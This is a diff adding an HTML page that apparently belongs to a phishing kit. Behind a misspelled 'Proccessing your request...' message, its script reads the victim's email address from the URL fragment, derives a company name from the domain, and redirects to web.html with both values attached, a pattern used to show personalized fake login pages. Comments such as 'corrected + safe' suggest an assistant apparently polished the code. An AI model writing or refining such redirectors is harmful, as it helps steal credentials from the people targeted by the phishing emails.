@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title> </title>
+</head>
+<body>
+
+<p style="color:red; font-size:25px;">Proccessing your request...</p>
+
+<script>
+  // Get value after #
+  var valueAfterEquals = window.location.hash.substring(1);
+
+  // Stop if fragment is missing
+  if (!valueAfterEquals || valueAfterEquals.indexOf("@") === -1) {
+    console.error("Invalid or missing email in URL fragment");
+  } else {
+
+    // ✅ YOUR CODE (corrected + safe)
+    var my_ai = valueAfterEquals;
+
+    var ind = my_ai.indexOf("@");
+    var my_slice = my_ai.substr(ind + 1);
+    const domain = my_slice;
+
+    var companyName = domain.split('.')[0];
+
+    function encodeEmail(email) {
+      return encodeURIComponent(email);
+    }
+
+    const num = Math.floor(Math.random() * 1990) + 188;
+    const num1 = Math.floor(Math.random() * 1990) + 188;
+
+    // ✅ Use a test destination
+    var redirectURL =
+      "web.html?" +
+      num +
+      "&x=" + num1 +
+      "&company=" + encodeURIComponent(companyName) +
+      "&md=" + encodeEmail(my_ai);
+
+    console.log("Redirecting to:", redirectURL);
+
+    // Redirect
+    window.location.href = redirectURL;
+  }
+</script>
+
+</body>
+</html>
